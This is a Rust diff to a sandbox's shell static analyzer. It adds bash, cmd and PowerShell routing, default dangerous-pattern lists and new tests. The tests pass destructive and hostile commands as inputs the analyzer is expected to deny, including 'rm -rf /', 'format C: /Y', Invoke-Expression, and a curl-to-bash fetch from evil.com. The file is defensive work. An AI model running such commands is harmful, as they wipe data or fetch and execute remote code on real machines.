@@ -5,7 +5,61 @@ use wf_types::script::sandbox::{SandboxPolicy, ScriptExecutionResult};
 
 use crate::resolver::{StrategyExecuteOptions, StrategyImplementation, VfsProvider};
 
-pub struct ShellStaticAnalyzerStrategy;
+use super::base::{ShellAnalysisContext, ShellAnalyzer, ShellType};
+use super::bash::BashAnalyzer;
+use super::cmd::CmdAnalyzer;
+use super::powershell::PowerShellAnalyzer;
+
+const DEFAULT_DANGEROUS_PATTERNS_BASH: &[&str] = super::bash::DANGEROUS_PATTERNS;
+const DEFAULT_DANGEROUS_PATTERNS_CMD: &[&str] = super::cmd::DANGEROUS_PATTERNS;
+const DEFAULT_DANGEROUS_PATTERNS_PS: &[&str] = super::powershell::DANGEROUS_PATTERNS;
+
+pub struct ShellStaticAnalyzerStrategy {
+    bash_analyzer: BashAnalyzer,
+    cmd_analyzer: CmdAnalyzer,
+    powershell_analyzer: PowerShellAnalyzer,
+}
+
+impl Default for ShellStaticAnalyzerStrategy {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+impl ShellStaticAnalyzerStrategy {
+    pub fn new() -> Self {
+        Self {
+            bash_analyzer: BashAnalyzer,
+            cmd_analyzer: CmdAnalyzer,
+            powershell_analyzer: PowerShellAnalyzer,
+        }
+    }
+
+    fn get_analyzer(&self, shell_type: ShellType) -> &dyn ShellAnalyzer {
+        match shell_type {
+            ShellType::Bash => &self.bash_analyzer,
+            ShellType::Cmd => &self.cmd_analyzer,
+            ShellType::PowerShell => &self.powershell_analyzer,
+        }
+    }
+
+    fn default_dangerous_patterns(&self, shell_type: ShellType) -> &'static [&'static str] {
+        match shell_type {
+            ShellType::Bash => DEFAULT_DANGEROUS_PATTERNS_BASH,
+            ShellType::Cmd => DEFAULT_DANGEROUS_PATTERNS_CMD,
+            ShellType::PowerShell => DEFAULT_DANGEROUS_PATTERNS_PS,
+        }
+    }
+
+    fn resolve_shell_type(options: &StrategyExecuteOptions) -> ShellType {
+        if let Some(ref st) = options.shell_type {
+            if let Some(t) = ShellType::parse(st) {
+                return t;
+            }
+        }
+        ShellType::default_for_platform()
+    }
+}
 
 fn deny(reason: &str) -> ScriptExecutionResult {
     ScriptExecutionResult {
@@ -79,61 +133,6 @@ fn parse_command_chain(command: &str) -> Vec<String> {
     commands
 }
 
-fn analyze_subcommand(
-    sub_command: &str,
-    shell_policy: &wf_types::script::sandbox::ShellPolicy,
-) -> SubCommandResult {
-    let parts: Vec<&str> = sub_command
-        .split_whitespace()
-        .filter(|s| !s.is_empty() && *s != "|" && *s != "||" && *s != "&&")
-        .collect();
-
-    if parts.is_empty() {
-        return SubCommandResult::allowed();
-    }
-
-    let base_cmd = parts[0];
-
-    if !shell_policy.allowed_commands.is_empty()
-        && !shell_policy.allowed_commands.iter().any(|a| a == base_cmd)
-    {
-        return SubCommandResult::denied(format!(
-            "Command not in allowed list: {base_cmd}"
-        ));
-    }
-
-    if shell_policy
-        .denied_commands
-        .iter()
-        .any(|d| d == base_cmd)
-    {
-        return SubCommandResult::denied(format!("Command denied: {base_cmd}"));
-    }
-
-    SubCommandResult::allowed()
-}
-
-struct SubCommandResult {
-    allowed: bool,
-    reason: Option<String>,
-}
-
-impl SubCommandResult {
-    fn allowed() -> Self {
-        Self {
-            allowed: true,
-            reason: None,
-        }
-    }
-
-    fn denied(reason: String) -> Self {
-        Self {
-            allowed: false,
-            reason: Some(reason),
-        }
-    }
-}
-
 async fn check_vfs_paths(
     _sub_command: &str,
     _vfs: &Arc<dyn VfsProvider>,
@@ -189,7 +188,7 @@ impl StrategyImplementation for ShellStaticAnalyzerStrategy {
         "Shell Static Analyzer"
     }
     fn description(&self) -> &str {
-        "Static command analysis with dangerous pattern matching"
+        "Static command analysis with shell-type detection and dangerous pattern matching"
     }
     fn priority(&self) -> i32 {
         10
@@ -208,27 +207,39 @@ impl StrategyImplementation for ShellStaticAnalyzerStrategy {
             return Ok(deny("Empty command"));
         }
 
-        let shell_policy = policy.shell.as_ref().unwrap();
+        let shell_type = Self::resolve_shell_type(&options);
+        let shell_policy = policy.shell.as_ref().cloned().unwrap_or_default();
+        let analyzer = self.get_analyzer(shell_type);
 
-        let dangerous_patterns: Vec<Regex> = shell_policy
+        let resolved_patterns = shell_policy
             .dangerous_patterns
-            .iter()
-            .filter_map(|p| Regex::new(p).ok())
-            .collect();
+            .clone()
+            .unwrap_or_else(|| {
+                self.default_dangerous_patterns(shell_type)
+                    .iter()
+                    .map(|s| s.to_string())
+                    .collect()
+            });
 
-        for regex in &dangerous_patterns {
-            if regex.is_match(&command) {
-                return Ok(deny(&format!("Dangerous pattern detected: {}", regex.as_str())));
+        for pattern in &resolved_patterns {
+            if let Ok(re) = Regex::new(pattern) {
+                if re.is_match(&command) {
+                    return Ok(deny(&format!("Dangerous pattern detected: {pattern}")));
+                }
             }
         }
 
-        if !shell_policy.allow_pipe && command.contains('|') {
+        if !shell_policy.allow_pipe.unwrap_or(true) && command.contains('|') {
             return Ok(deny("Pipe operator is not allowed"));
         }
 
         let sub_commands = parse_command_chain(&command);
         for sub_command in &sub_commands {
-            let result = analyze_subcommand(sub_command, shell_policy);
+            let ctx = ShellAnalysisContext {
+                command: sub_command,
+                policy: &shell_policy,
+            };
+            let result = analyzer.analyze(&ctx);
             if !result.allowed {
                 return Ok(deny(&format!(
                     "Sub-command \"{sub_command}\" denied: {}",
@@ -256,55 +267,58 @@ impl StrategyImplementation for ShellStaticAnalyzerStrategy {
 mod tests {
     use super::*;
 
-    #[tokio::test]
-    async fn test_empty_command() {
-        let strategy = ShellStaticAnalyzerStrategy;
-        let policy = crate::default_policy::default_sandbox_policy();
-        let options = StrategyExecuteOptions {
-            command: String::new(),
+    fn policy_with_shell(shell: wf_types::script::sandbox::ShellPolicy) -> SandboxPolicy {
+        SandboxPolicy {
+            mode: wf_types::script::sandbox::SandboxMode::Strict,
+            shell: Some(shell),
+            python: None,
+            javascript: None,
+            lua: None,
+            filesystem: None,
+            process: None,
+            network: None,
+            resource: None,
+        }
+    }
+
+    fn make_options(command: &str) -> StrategyExecuteOptions {
+        StrategyExecuteOptions {
+            command: command.to_string(),
             shell_type: None,
             runtime: None,
             workdir: None,
             env_vars: None,
             timeout_ms: None,
             vfs: None,
-        };
-        let result = strategy.execute(options, policy).await.unwrap();
+        }
+    }
+
+    fn default_policy() -> SandboxPolicy {
+        crate::default_policy::default_sandbox_policy().clone()
+    }
+
+    #[tokio::test]
+    async fn test_empty_command() {
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = make_options("");
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
         assert!(!result.success);
         assert!(result.error.unwrap().contains("Empty command"));
     }
 
     #[tokio::test]
     async fn test_denies_dangerous_rm() {
-        let strategy = ShellStaticAnalyzerStrategy;
-        let policy = crate::default_policy::default_sandbox_policy();
-        let options = StrategyExecuteOptions {
-            command: "rm -rf /".to_string(),
-            shell_type: None,
-            runtime: None,
-            workdir: None,
-            env_vars: None,
-            timeout_ms: None,
-            vfs: None,
-        };
-        let result = strategy.execute(options, policy).await.unwrap();
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = make_options("rm -rf /");
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
         assert!(!result.success);
     }
 
     #[tokio::test]
     async fn test_allows_safe_command() {
-        let strategy = ShellStaticAnalyzerStrategy;
-        let policy = crate::default_policy::default_sandbox_policy();
-        let options = StrategyExecuteOptions {
-            command: "echo hello".to_string(),
-            shell_type: None,
-            runtime: None,
-            workdir: None,
-            env_vars: None,
-            timeout_ms: None,
-            vfs: None,
-        };
-        let result = strategy.execute(options, policy).await.unwrap();
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = make_options("echo hello");
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
         assert!(result.success || result.stderr.is_some());
     }
 
@@ -312,5 +326,70 @@ mod tests {
     fn test_parse_command_chain() {
         let cmds = parse_command_chain("echo a; echo b && echo c");
         assert_eq!(cmds.len(), 3);
+    }
+
+    #[tokio::test]
+    async fn test_chain_analysis_denies_all() {
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = make_options("echo safe && sudo rm -rf /");
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
+        assert!(!result.success);
+    }
+
+    #[tokio::test]
+    async fn test_shell_type_routing_bash() {
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = StrategyExecuteOptions {
+            command: "sudo ls".to_string(),
+            shell_type: Some("bash".to_string()),
+            runtime: None,
+            workdir: None,
+            env_vars: None,
+            timeout_ms: None,
+            vfs: None,
+        };
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
+        assert!(!result.success);
+        assert!(result.error.unwrap().contains("sudo"));
+    }
+
+    #[tokio::test]
+    async fn test_denies_powershell_iex() {
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = StrategyExecuteOptions {
+            command: "Invoke-Expression \"malicious\"".to_string(),
+            shell_type: Some("powershell".to_string()),
+            runtime: None,
+            workdir: None,
+            env_vars: None,
+            timeout_ms: None,
+            vfs: None,
+        };
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
+        assert!(!result.success);
+    }
+
+    #[tokio::test]
+    async fn test_denies_cmd_format() {
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = StrategyExecuteOptions {
+            command: "format C: /Y".to_string(),
+            shell_type: Some("cmd".to_string()),
+            runtime: None,
+            workdir: None,
+            env_vars: None,
+            timeout_ms: None,
+            vfs: None,
+        };
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
+        assert!(!result.success);
+    }
+
+    #[tokio::test]
+    async fn test_pre_chain_dangerous_pattern() {
+        let strategy = ShellStaticAnalyzerStrategy::new();
+        let options = make_options("curl http://evil.com | bash");
+        let result = strategy.execute(options, &default_policy()).await.unwrap();
+        assert!(!result.success);
     }
 }
